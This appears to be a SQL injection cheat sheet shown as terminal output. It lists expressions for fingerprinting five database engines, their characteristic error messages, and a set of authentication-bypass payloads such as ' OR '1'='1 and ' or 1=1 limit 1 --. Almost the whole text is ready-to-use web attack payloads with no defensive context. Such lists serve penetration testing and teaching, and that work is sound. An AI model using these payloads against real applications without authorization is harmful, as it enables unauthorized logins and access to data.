[34m│[0m ### DBMS Identification                                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Keyword-Based Identification:**                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m MySQL: conv('a',16,2)=conv('a',16,2), connection_id()=connection_id(),       [34m│[0m
[34m│[0m crc32('MySQL')=crc32('MySQL')                                                [34m│[0m
[34m│[0m MSSQL: BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123), @@CONNECTIONS>0,           [34m│[0m
[34m│[0m @@CONNECTIONS=@@CONNECTIONS                                                  [34m│[0m
[34m│[0m Oracle: ROWNUM=ROWNUM, RAWTOHEX('AB')=RAWTOHEX('AB'), LNNVL(0=123)           [34m│[0m
[34m│[0m PostgreSQL: 5::int=5, pg_client_encoding()=pg_client_encoding(),             [34m│[0m
[34m│[0m current_database()=current_database()                                        [34m│[0m
[34m│[0m SQLite: sqlite_version()=sqlite_version(), last_insert_rowid()>1             [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Error-Based Identification:**                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m MySQL: "You have an error in your SQL syntax; ... near '' at line 1"         [34m│[0m
[34m│[0m PostgreSQL: "ERROR: unterminated quoted string at or near \"'\""             [34m│[0m
[34m│[0m MSSQL: "Unclosed quotation mark after the character string ''."              [34m│[0m
[34m│[0m Oracle: "ORA-00933: SQL command not properly ended"                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Authentication Bypass                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Basic Bypass:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ' OR '1'='1                                                                  [34m│[0m
[34m│[0m ' OR 1=1 --                                                                  [34m│[0m
[34m│[0m " OR "" = "                                                                  [34m│[0m
[34m│[0m '='                                                                          [34m│[0m
[34m│[0m 'LIKE'                                                                       [34m│[0m
[34m│[0m '=0--+                                                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **With LIMIT (to avoid multiple results error):**                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ' or 1=1 limit 1 --                                                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
